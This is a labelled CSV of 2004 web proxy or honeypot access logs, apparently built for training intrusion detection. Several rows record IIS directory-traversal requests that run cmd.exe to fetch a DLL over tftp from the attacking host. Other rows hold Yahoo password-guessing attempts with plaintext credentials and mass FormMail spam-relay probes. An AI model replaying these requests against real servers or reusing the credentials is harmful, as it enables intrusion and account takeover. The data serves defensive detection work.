,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
3736,192.117.242.67,10/Mar/2004:06:19:51 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3737,61.237.215.17,10/Mar/2004:06:19:52 -0500,http://rankstar.com/search.php ,200,33178,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/search.php,0,Microsoft Internet Explorer
3738,203.121.182.142,10/Mar/2004:06:19:53 -0500,209.15.20.140:25 ,200,0,"""-""",-,n,0,209.15.20.140:25,0,without browser
3739,61.237.215.17,10/Mar/2004:06:19:56 -0500,http://rankstar.com/go.php?bx=hfzzzzhfzzzmzp&b=hszhzdhdzzzmzp&k=szscadsasaschpsoaaassz&u=siamadsoan&l=hpzdzchazshazvzxhohszizhhhzxhxzvzahpsxzfazhhzohdzkzdhahzzxzhshzfhhzozshphczszahszahxanzfsohzzczhhdzdhdzvzchmhxzczfhszzhczyzxhphazczahdzxssznzshihazxzxhazshdzdzfhphzzzzhhszdhdzvzchmhxzczzhszihczvzxhmhazczahfzxhazkzxhmhxzczchhzohdzvzfhkhazczahczchczozahksxzfazhhzihdzpzdsphsaxzzsszfhszizxhkhczszahszahxzkzfhphhafzzhzzdhizozahksszfzzhszchczyzchvhazszchszxhsznzshyhazfzfhzzfhcznzxhohszazahdzxssznzzhmhczszahszahxzkzfhahzzczzhhzxhxzvzahphczxzhhszahczpzxhahazdzahhzxhazkzxhmhxzcashhaahdzizxhphazazshszahazkzxhmhxzczchzzfhcznzxhohszazahxzxhxzvzfhmhdzxzchxzxhczyzchphzafzahmzdhhzozxhyhdzfaxhazshfzvzfhohzzczhhpzfhazizahkhszdazhazxhfzfzfhyhzzazhshzfhxzozihkhczdashhzxhdzdzfsmhzzxzcshzcsaziafhkhazfaxhazhhdzfzfsihszizzhfzfssznzchyhxzfaxhhzshfznzdhvhzzzzhshzcsdznahhmhfzdzchzzshfzfzfsihaaxzzhazdhszozfhphazdzxhhaahdaizfhshzzzzhhdzcscziaxhkhxzfzahhashczkzfhphhafzzhzzdhizozahksszfzzhazzhczpzxhnhazczahdzxssznzzhmsczxzchhzohdznzfhkhszxzzsxzxhozozohkhzzfzxhhzchfzpzdhkhszszahdzxhdzvaahphmzxzhhszahczozxhvhazozahmzxhfzvzzhmhdzxachszchfzyzfsihzzozzhxzdhdznzhhmsczxzxhhzihdzvzfhvhzzxzzhhzchczvzzhmhzzxzmhszxhczdzxhvhazszahdzxhhzvzdhmhfzxzfhszfhczvzxhvhazizahzzxsazvzzhysczfzdhhzshfzvzdhkhszhzahhzxsxzizahkhhzdzdhhaxhdzvzdsihazazzhxzdhzzizohksazfzmhhzfhdzizfhvhzzfzshdzxhhzvzfhmhdzxzfhsaahxzpzxsihazdzhshzfsczizfhkhpzfzahzzhhdzvzfhkhszozasxzxssziafhkhmzfzchzzohdzvzdskhzzzzhhhzchzzoafhihhzszmhxzchdamzssihzahzhhmzfsszkzohisszfaahxzdhdzyzahihhzizxsxzfhdzizxhkhszdzshczfhsznzfsvhzzczxsxzfhdzizahohczazmhzahhfzfzahohczxzchpzahczkzihyhszdzchzashczvzdhkhszzzahszxhzzvzfhmhszxachszshfayzfhohhafzzhszfhczizhhkhzzczshszfhcznzxhkhaaszahpzdhdznzfhmhxzxzfhszchczdzxhmhazdzasxzxsxzizfhphhzxzahszdhczdzxhvhazazahszxhdzvashmhazfzozisiaisphmhvhazhhihfzizmzmzczchczfhozizkscaoadao&tw=hszdzmhxzfhizfzdhnhd&s=svacsasfsfsmaydm&t= ,300,0,"""http://rankstar.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),m,1,/go.php,8,Microsoft Internet Explorer
3740,12.221.212.151,10/Mar/2004:06:20:04 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.7 ( compatible; MSIE 5.01; Windows 95; FREEI v2.53 ),n,0,/members/index.html,0,Microsoft Internet Explorer
3741,12.221.212.151,10/Mar/2004:06:20:05 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.0 ( compatible; [en]; Windows NT5.0; DigiExt ),n,0,/members/index.html,0,without browser
3742,61.237.215.17,10/Mar/2004:06:20:13 -0500,http://rankstar.com/go.php?u=siamadsoan&l=hpzdzchazshazvzxhohszizhhhzxhxzvzahpsxzfazhhzohdzkzdhahzzxzhshzfhhzozshphczszahszahxanzfsohzzczhhdzdhdzvzchmhxzczfhszzhczyzxhphazczahdzxssznzshihazxzxhazshdzdzfhphzzzzhhszdhdzvzchmhxzczzhszihczvzxhmhazczahfzxhazkzxhmhxzczchhzohdzvzfhkhazczahczchczozahksxzfazhhzihdzpzdsphsaxzzsszfhszizxhkhczszahszahxzkzfhphhafzzhzzdhizozahksszfzzhszchczyzchvhazszchszxhsznzshyhazfzfhzzfhcznzxhohszazahdzxssznzzhmhczszahszahxzkzfhahzzczzhhzxhxzvzahphczxzhhszahczpzxhahazdzahhzxhazkzxhmhxzcashhaahdzizxhphazazshszahazkzxhmhxzczchzzfhcznzxhohszazahxzxhxzvzfhmhdzxzchxzxhczyzchphzafzahmzdhhzozxhyhdzfaxhazshfzvzfhohzzczhhpzfhazizahkhszdazhazxhfzfzfhyhzzazhshzfhxzozihkhczdashhzxhdzdzfsmhzzxzcshzcsaziafhkhazfaxhazhhdzfzfsihszizzhfzfssznzchyhxzfaxhhzshfznzdhvhzzzzhshzcsdznahhmhfzdzchzzshfzfzfsihaaxzzhazdhszozfhphazdzxhhaahdaizfhshzzzzhhdzcscziaxhkhxzfzahhashczkzfhphhafzzhzzdhizozahksszfzzhazzhczpzxhnhazczahdzxssznzzhmsczxzchhzohdznzfhkhszxzzsxzxhozozohkhzzfzxhhzchfzpzdhkhszszahdzxhdzvaahphmzxzhhszahczozxhvhazozahmzxhfzvzzhmhdzxachszchfzyzfsihzzozzhxzdhdznzhhmsczxzxhhzihdzvzfhvhzzxzzhhzchczvzzhmhzzxzmhszxhczdzxhvhazszahdzxhhzvzdhmhfzxzfhszfhczvzxhvhazizahzzxsazvzzhysczfzdhhzshfzvzdhkhszhzahhzxsxzizahkhhzdzdhhaxhdzvzdsihazazzhxzdhzzizohksazfzmhhzfhdzizfhvhzzfzshdzxhhzvzfhmhdzxzfhsaahxzpzxsihazdzhshzfsczizfhkhpzfzahzzhhdzvzfhkhszozasxzxssziafhkhmzfzchzzohdzvzdskhzzzzhhhzchzzoafhihhzszmhxzchdamzssihzahzhhmzfsszkzohisszfaahxzdhdzyzahihhzizxsxzfhdzizxhkhszdzshczfhsznzfsvhzzczxsxzfhdzizahohczazmhzahhfzfzahohczxzchpzahczkzihyhszdzchzashczvzdhkhszzzahszxhzzvzfhmhszxachszshfayzfhohhafzzhszfhczizhhkhzzczshszfhcznzxhkhaaszahpzdhdznzfhmhxzxzfhszchczdzxhmhazdzasxzxsxzizfhphhzxzahszdhczdzxhvhazazahszxhdzvashmhazfzozisiaisphmhvhazhhihfzizmzmzczchczfhozizkscaoadao&k=szscadsasaschpsoaaassz&b=hszhzdhdzzzmzp&s=svacsasfsfsmaydm&x=&t=&tw=hszdzmhxzfhizfzdhnhd&bx=hfzzzzhfzzzmzp&f=52a741b7f2e3471def40ea08bd78dab1 ,300,0,"""http://rankstar.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),m,1,/go.php,8,Microsoft Internet Explorer
3743,67.83.151.132,10/Mar/2004:06:20:16 -0500,http://www.sony-asia.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3744,61.172.244.109,10/Mar/2004:06:20:17 -0500,210.242.13.135:25 ,200,0,"""-""",-,n,0,210.242.13.135:25,0,without browser
3745,61.237.215.17,10/Mar/2004:06:20:18 -0500,http://rankstar.com/jump.php?l=hpzdzchazshazvzxhohszizhhhzxhxzvzahpsxzfazhhzohdzkzdhahzzxzhshzfhhzozshphczszahszahxanzfsohzzczhhdzdhdzvzchmhxzczfhszzhczyzxhphazczahdzxssznzshihazxzxhazshdzdzfhphzzzzhhszdhdzvzchmhxzczzhszihczvzxhmhazczahfzxhazkzxhmhxzczchhzohdzvzfhkhazczahczchczozahksxzfazhhzihdzpzdsphsaxzzsszfhszizxhkhczszahszahxzkzfhphhafzzhzzdhizozahksszfzzhszchczyzchvhazszchszxhsznzshyhazfzfhzzfhcznzxhohszazahdzxssznzzhmhczszahszahxzkzfhahzzczzhhzxhxzvzahphczxzhhszahczpzxhahazdzahhzxhazkzxhmhxzcashhaahdzizxhphazazshszahazkzxhmhxzczchzzfhcznzxhohszazahxzxhxzvzfhmhdzxzchxzxhczyzchphzafzahmzdhhzozxhyhdzfaxhazshfzvzfhohzzczhhpzfhazizahkhszdazhazxhfzfzfhyhzzazhshzfhxzozihkhczdashhzxhdzdzfsmhzzxzcshzcsaziafhkhazfaxhazhhdzfzfsihszizzhfzfssznzchyhxzfaxhhzshfznzdhvhzzzzhshzcsdznahhmhfzdzchzzshfzfzfsihaaxzzhazdhszozfhphazdzxhhaahdaizfhshzzzzhhdzcscziaxhkhxzfzahhashczkzfhphhafzzhzzdhizozahksszfzzhazzhczpzxhnhazczahdzxssznzzhmsczxzchhzohdznzfhkhszxzzsxzxhozozohkhzzfzxhhzchfzpzdhkhszszahdzxhdzvaahphmzxzhhszahczozxhvhazozahmzxhfzvzzhmhdzxachszchfzyzfsihzzozzhxzdhdznzhhmsczxzxhhzihdzvzfhvhzzxzzhhzchczvzzhmhzzxzmhszxhczdzxhvhazszahdzxhhzvzdhmhfzxzfhszfhczvzxhvhazizahzzxsazvzzhysczfzdhhzshfzvzdhkhszhzahhzxsxzizahkhhzdzdhhaxhdzvzdsihazazzhxzdhzzizohksazfzmhhzfhdzizfhvhzzfzshdzxhhzvzfhmhdzxzfhsaahxzpzxsihazdzhshzfsczizfhkhpzfzahzzhhdzvzfhkhszozasxzxssziafhkhmzfzchzzohdzvzdskhzzzzhhhzchzzoafhihhzszmhxzchdamzssihzahzhhmzfsszkzohisszfaahxzdhdzyzahihhzizxsxzfhdzizxhkhszdzshczfhsznzfsvhzzczxsxzfhdzizahohczazmhzahhfzfzahohczxzchpzahczkzihyhszdzchzashczvzdhkhszzzahszxhzzvzfhmhszxachszshfayzfhohhafzzhszfhczizhhkhzzczshszfhcznzxhkhaaszahpzdhdznzfhmhxzxzfhszchczdzxhmhazdzasxzxsxzizfhphhzxzahszdhczdzxhvhazazahszxhdzvashmhazfzozisiaisphmhvhazhhihfzizmzmzczchczfhozizkscaoadao ,200,2274,"""http://rankstar.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),m,1,/jump.php,1,Microsoft Internet Explorer
3746,68.48.142.117,10/Mar/2004:06:20:23 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
3747,203.121.182.140,10/Mar/2004:06:20:43 -0500,168.226.30.61:25 ,500,434,"""-""",-,n,0,168.226.30.61:25,0,without browser
3748,67.32.209.144,10/Mar/2004:06:20:47 -0500,http://www.shadowplayers.com/members/memberpage.html ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 5.0; Windows 98),n,0,/members/memberpage.html,0,Microsoft Internet Explorer
3749,67.83.151.132,10/Mar/2004:06:20:58 -0500,http://www.prodiscussions.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3750,68.48.142.117,10/Mar/2004:06:21:13 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
3751,68.48.142.117,10/Mar/2004:06:21:17 -0500,/d/httpodbc.dll ,400,282,"""-""",-,m,1,/d/httpodbc.dll,0,without browser
3752,67.83.151.132,10/Mar/2004:06:21:38 -0500,http://www.applebees.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3753,67.83.151.132,10/Mar/2004:06:21:44 -0500,http://www.tedthorsen.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3754,212.160.136.163,10/Mar/2004:06:21:58 -0500,http://www.blowsearch.com/search.php?affiliate=artur&keywords=scsi ,200,36840,"""http://fiskarsforyou.w.interia.pl/eng/""",Mozilla/6.0 [en] (Win98; I),n,0,/search.php,2,without browser
3755,221.7.192.11,10/Mar/2004:06:21:59 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/index.asp,0,Microsoft Internet Explorer
3756,212.160.136.163,10/Mar/2004:06:22:03 -0500,http://www.blowsearch.com/r.php?mc=754608P4478625O5758605O4Q5958605O4P525N5757595P695O47585P695O40546O9P4854699P4S809080946N9P4958585N5N5R5R59546N8P4O5O5N546796679098855O8N86908O8N865R8089988O80965=d?cfnDDDgyhnsrq/upenrf/zbpDDDkrncfDDDjjj//CCCcgguCCCCCCMMM112CCCCCC511DDD1CCCCCCvfpfCCCCCC2188209812OOO7294318308OOO012DDD712DDD95DDD97CCCCCC2142309812CCCCCC012DDD712DDD95DDD97CCCCCCehgenCCCCCC]ffbOupenrF[CCCCCC7294318308&v=76abcba415deb128aa68eecfc0de2a75 ,300,2,"""http://www.blowsearch.com/search.php?affiliate=artur&keywords=scsi""",Mozilla/6.0 [en] (Win98; I),m,1,/r.php,2,without browser
3757,217.208.64.55,10/Mar/2004:06:22:04 -0500,http://xxxkiki.com/members/ ,200,0,"""http://xxxkiki.com/members/""",Mozilla/5.0 ( compatible; MSIE 5.01; Windows XP; DigiExt ),n,0,/members/,0,Microsoft Internet Explorer
3758,68.48.142.117,10/Mar/2004:06:22:07 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
3759,212.160.136.163,10/Mar/2004:06:22:08 -0500,http://www.spaex.com/search/default.asp?q=45897B7788797E457A7B79857A7B447789865586534A4B4B3C7A53484E4E4A4A4747483C8A538979897F3C8853473C8B53493B485C47463B485C4846464A414C3B4957484D3B4957464B4157633C795346 ,300,121,"""http://www.blowsearch.com/search.php?affiliate=artur&keywords=scsi""",Mozilla/6.0 [en] (Win98; I),n,0,/search/default.asp,1,without browser
3760,192.117.242.67,10/Mar/2004:06:22:15 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3761,212.160.136.163,10/Mar/2004:06:22:22 -0500,http://www.spaex.com/search/decode.asp?p=455&d=28844112&t=scsi&r=1&u=3%2F10%2F2004+6%3A27%3A05+AM&c=0&ref=http%3A%2F%2Fwww%2Eblowsearch%2Ecom%2Fsearch%2Ephp%3Faffiliate%3Dartur%26keywords%3Dscsi ,300,121,"""http://www.blowsearch.com/search.php?affiliate=artur&keywords=scsi""",Mozilla/6.0 [en] (Win98; I),n,0,/search/decode.asp,7,without browser
3762,212.160.136.163,10/Mar/2004:06:22:29 -0500,http://click.atdmt.com/MON/go/shdgtmon00700036mon/direct%3Bat.monmon009618%3Bct.1/01/ ,300,0,"""http://www.blowsearch.com/search.php?affiliate=artur&keywords=scsi""",Mozilla/6.0 [en] (Win98; I),m,1,/MON/go/shdgtmon00700036mon/direct%3Bat.monmon009618%3Bct.1/01/,0,without browser
3763,212.160.136.163,10/Mar/2004:06:22:38 -0500,http://jobsearch.monster.com/?WT.mc_n=01;FUV;SOH;RWA;FUV05;A0;C;TXK ,200,35572,"""http://www.blowsearch.com/search.php?affiliate=artur&keywords=scsi""",Mozilla/6.0 [en] (Win98; I),n,0,/,1,without browser
3764,67.125.136.193,10/Mar/2004:06:22:42 -0500,http://www.teenflood.com/members3945/ ,200,566,"""http://www.teenflood.com/members3945/""",Mozilla/4.6 ( compatible; [dk]; Windows XP; DigiExt ),n,0,/members3945/,0,without browser
3765,67.83.151.132,10/Mar/2004:06:22:52 -0500,http://www.buckhickman.co.uk/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3766,68.48.142.117,10/Mar/2004:06:22:57 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
3767,208.190.202.194,10/Mar/2004:06:23:09 -0500,http://l5.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_een&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3768,208.190.202.194,10/Mar/2004:06:23:20 -0500,http://l5.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_e_r_i_n_&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3769,221.7.192.11,10/Mar/2004:06:23:27 -0500,http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3 ,200,578,"""http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/baidu,2,Microsoft Internet Explorer
3770,67.83.151.132,10/Mar/2004:06:23:34 -0500,http://www.probiohealth.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3771,221.7.192.11,10/Mar/2004:06:23:40 -0500,http://www.ccbbs.cn/ ,200,12711,"""http://www.ccbbs.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 95),n,0,/,0,Microsoft Internet Explorer
3772,67.32.209.144,10/Mar/2004:06:23:44 -0500,http://www.shadowplayers.com/members/memberpage.html ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 5.01; Windows 98),n,0,/members/memberpage.html,0,Microsoft Internet Explorer
3773,68.48.142.117,10/Mar/2004:06:23:47 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
3774,67.83.151.132,10/Mar/2004:06:23:49 -0500,http://www.anfm.com.au/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3775,208.190.202.194,10/Mar/2004:06:23:50 -0500,http://l5.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_e_b_&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3776,67.83.151.132,10/Mar/2004:06:24:15 -0500,http://www.wmcclure.co.uk/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3777,68.48.142.117,10/Mar/2004:06:24:37 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
3778,67.32.209.144,10/Mar/2004:06:24:58 -0500,http://www.shadowplayers.com/members/memberpage.html ,200,0,"""-""",Mozilla/4.01 [de]C-DT (WinNT; I),n,0,/members/memberpage.html,0,without browser
3779,218.93.92.137,10/Mar/2004:06:25:04 -0500,http://myaffiliatesolutions.com/program/track.php?keywords=steroids&ac=33&af=266 ,200,578,"""http://www.livesnet.com/""",Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010726+Netscape6/6.1,n,0,/program/track.php,3,Netscape
3780,68.105.26.80,10/Mar/2004:06:25:06 -0500,http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=kittylicious1500&passwd=lucky ,200,566,"""-""",-,n,0,/config/login,8,without browser
3781,192.117.242.67,10/Mar/2004:06:25:10 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3782,61.53.76.40,10/Mar/2004:06:25:10 -0500,http://69.59.175.60/found-best.com/search.php ,200,14191,"""http://www.sanlala.com/index.html""",Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
3783,67.0.150.78,10/Mar/2004:06:25:14 -0500,chat.hk3.outblaze.com:6665 ,400,297,"""-""",-,n,0,chat.hk3.outblaze.com:6665,0,without browser
3784,218.78.209.42,10/Mar/2004:06:25:24 -0500,217.228.226.220:25 ,500,438,"""-""",-,n,0,217.228.226.220:25,0,without browser
3785,61.53.76.40,10/Mar/2004:06:25:25 -0500,http://69.59.175.60/found-best.com/search.php ,200,15639,"""http://www.MayaPaid4Mail.com/pages/ptc.php""",Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
3786,68.48.142.117,10/Mar/2004:06:25:27 -0500,/scripts/..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../httpodbc.dll,0,without browser
3787,208.190.202.194,10/Mar/2004:06:25:31 -0500,http://l5.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_e_n_i_g_m_a&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3788,67.83.151.132,10/Mar/2004:06:25:31 -0500,http://www.wmcclure.co.uk/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3789,61.237.215.17,10/Mar/2004:06:25:37 -0500,http://www.gravity-search.net/cgi-bin/smartsearch.cgi ,200,531,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/cgi-bin/smartsearch.cgi,0,Microsoft Internet Explorer
3790,208.190.202.194,10/Mar/2004:06:25:39 -0500,http://l5.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_eber_&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3791,67.125.136.193,10/Mar/2004:06:25:51 -0500,http://www.teenflood.com/members3945/ ,200,566,"""http://www.teenflood.com/members3945/""",Mozilla/3.01 ( compatible; MSIE 4.01; Windows 95; DigiExt ),n,0,/members3945/,0,Microsoft Internet Explorer
3792,67.83.151.132,10/Mar/2004:06:26:02 -0500,http://www.wilket.co.nz/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3793,67.83.151.132,10/Mar/2004:06:26:06 -0500,http://www2.ocn.ne.jp/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3794,208.190.202.194,10/Mar/2004:06:26:10 -0500,http://l5.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_h_e_c_a_t_e_&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3795,68.48.142.117,10/Mar/2004:06:26:17 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3796,67.83.151.132,10/Mar/2004:06:26:31 -0500,http://www9.ocn.ne.jp/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3797,67.83.151.132,10/Mar/2004:06:26:32 -0500,http://www.mctv.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3798,67.83.151.132,10/Mar/2004:06:26:53 -0500,http://www.cent.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3799,67.83.151.132,10/Mar/2004:06:26:58 -0500,http://www.sovereign-ind.co.nz/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3800,68.48.142.117,10/Mar/2004:06:27:08 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3801,213.76.192.124,10/Mar/2004:06:27:09 -0500,http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi ,200,2219,"""http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),n,0,/trino/ProxyJ/prxjdg.cgi,0,Microsoft Internet Explorer
